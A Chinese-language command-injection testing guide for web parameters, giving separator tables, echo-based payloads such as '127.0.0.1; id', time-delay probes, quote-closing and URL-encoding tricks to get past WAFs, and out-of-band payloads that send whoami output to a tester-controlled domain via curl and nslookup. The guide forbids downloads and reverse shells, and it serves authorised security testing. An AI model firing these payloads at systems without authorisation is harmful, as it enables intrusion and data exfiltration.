### 命令注入测试策略

#### 1. 识别条件
- 参数涉及**主机名/IP/域名**（ping、traceroute、nslookup 工具类）。
- 参数涉及**文件名/路径**（压缩、解压、转码、截图、PDF 转换）。
- 响应中出现 `/bin/sh`、`sh:`、`cmd.exe`、`is not recognized as an internal or external command`、`No such file or directory` 等系统命令错误。
- 典型触发功能：Ping 测试、域名查询、图片处理、文档转换、备份/恢复、定时任务配置。

#### 2. 测试方法

**阶段一：分隔符探测**
常见分隔符（按平台）：

| 平台 | 分隔符 |
|------|--------|
| Linux/Unix | `;`、`&&`、`\|`、`\|\|`、换行 `%0a`、反引号 `` ` ``、`$(cmd)` |
| Windows | `&`、`&&`、`\|`、`\|\|`、换行 `%0a` |

**阶段二：有回显场景**
- `127.0.0.1; id`、`127.0.0.1 && whoami`、`127.0.0.1 | whoami`
- `$(id)`、`` `id` ``（嵌入式执行）
- 观察响应是否包含 `uid=`、用户名、系统信息。

**阶段三：无回显时延时判定**
- Linux：`127.0.0.1; sleep 5`、`; ping -c 5 127.0.0.1`
- Windows：`& ping -n 5 127.0.0.1`
- 对比响应时间是否出现稳定延迟。

**阶段四：带外回连判定（彻底无回显）**
- `; curl http://<自控域名>/$(whoami)`
- `; nslookup $(whoami).<自控域名>`
- 观察 DNSLog/HTTP 日志接收到的子域名携带了命令输出。

#### 3. 构造原则
- **Header 保持**：只改单个业务参数。
- **无害命令优先**：`id`、`whoami`、`hostname`、`sleep`；**禁止**执行下载、反弹 shell、写文件类命令。
- 当字段本身会被引号包裹时，注意闭合引号：`"; id; #`、`'; id; #`。
- URL 编码：`;` → `%3b`、空格 → `%20`、换行 → `%0a`（部分 WAF 对未编码敏感字符拦截）。

#### 4. 判定依据
- 回显包含系统命令输出（用户名、进程信息、文件路径）。
- 时延 Payload 触发稳定的 5 秒延迟（重复 2 次确认）。
- 带外通道收到与命令输出对应的 DNS 或 HTTP 请求。

#### 5. 常见误报与排除
- 业务可能使用受限 API（`execFile` + 白名单参数），即使注入了分隔符也不会执行——以实际回显/时延为准。
- 某些参数被 URL 编码后传给后端，后端未解码，会看起来像过滤生效但并不代表安全，换不编码或双重编码再试。
- 响应中的 `sh:` 字样可能来自业务脚本的固定输出，不一定说明注入成功，需结合 Payload 对比。
